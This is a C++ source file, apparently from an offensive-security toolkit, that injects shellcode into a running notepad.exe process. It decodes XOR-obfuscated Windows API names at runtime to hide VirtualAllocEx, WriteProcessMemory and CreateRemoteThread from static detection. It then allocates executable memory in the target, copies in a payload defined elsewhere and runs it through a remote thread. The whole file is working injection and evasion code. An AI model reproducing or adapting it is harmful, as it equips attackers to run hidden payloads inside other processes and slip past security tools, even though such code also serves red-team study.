#include "utils.h"
#include "process_injection_api_obfuscation.h"
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>


void processInjectionAPIObfuscation() {

	const char* key = "offensivepanda";
	size_t k_len = strlen(key);
	
	const wchar_t* targetProcess = L"notepad.exe"; // Target process name
	DWORD pid = GetProcessIdByName(targetProcess);

	if (pid == 0) {
		std::wcerr << L"Target process not found." << std::endl;
		return;
	}

	std::wcout << L"Target process ID: " << pid << std::endl;

	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
		FALSE, pid);

	if (!hProcess) {
		std::wcerr << L"Failed to open process. Error: " << GetLastError() << std::endl;
		return;
	}


	HMODULE library = GetModuleHandle(L"kernel32.dll");
	unsigned char sVAEx[] = { 0x39, 0x0f, 0x14, 0x11, 0x1b, 0x12, 0x05, 0x37, 0x09, 0x1c, 0x0e, 0x0d, 0x21, 0x19 };
	unsigned char sWPM[] = { 0x38, 0x14, 0x0f, 0x11, 0x0b, 0x23, 0x1b, 0x19, 0x06, 0x15, 0x12, 0x1d, 0x29, 0x04, 0x02, 0x09, 0x14, 0x1c };
	unsigned char sCRT[] = { 0x2c, 0x14, 0x03, 0x04, 0x1a, 0x16, 0x3b, 0x13, 0x08, 0x1f, 0x15, 0x0b, 0x30, 0x09, 0x1d, 0x03, 0x07, 0x01 };
	LPCSTR A = DAndP(sVAEx, sizeof(sVAEx), key, k_len);
	LPCSTR B = DAndP(sWPM, sizeof(sWPM), key, k_len);
	LPCSTR C = DAndP(sCRT, sizeof(sCRT), key, k_len);

	VAExType pVAEx = (VAExType)GetProcAddress(library, (LPCSTR)A);
	WPMType pWPM = (WPMType)GetProcAddress(library, (LPCSTR)B);
	CRTType pCRT = (CRTType)GetProcAddress(library, (LPCSTR)C);


	// Allocate a memory buffer for payload with permission RWX
	LPVOID remoteMemory = pVAEx(hProcess, 0, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!remoteMemory) {
		std::wcerr << L"Failed to allocate memory in target process. Error: " << GetLastError() << std::endl;
		CloseHandle(hProcess);
		return;
	}

	// copy payload to allocated buffer using WriteProcessMemory()
	if (!pWPM(hProcess, remoteMemory, sc, sc_len, NULL)) {
		std::wcerr << L"Failed to write shellcode to target process. Error: " << GetLastError() << std::endl;
		VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return;
	}

	// run shellcode
	HANDLE hthread = pCRT(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);

	if (!hthread) {
		std::wcerr << L"Failed to create remote thread. Error: " << GetLastError() << std::endl;
		VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return;
	}

	std::wcout << L"Remote thread successfully created." << std::endl;

	// Wait for the thread to finish execution
	WaitForSingleObject(hthread, INFINITE);

	// Clean up
	CloseHandle(hthread);
	VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
	CloseHandle(hProcess);

	std::wcout << L"Shellcode executed and resources cleaned up." << std::endl;
}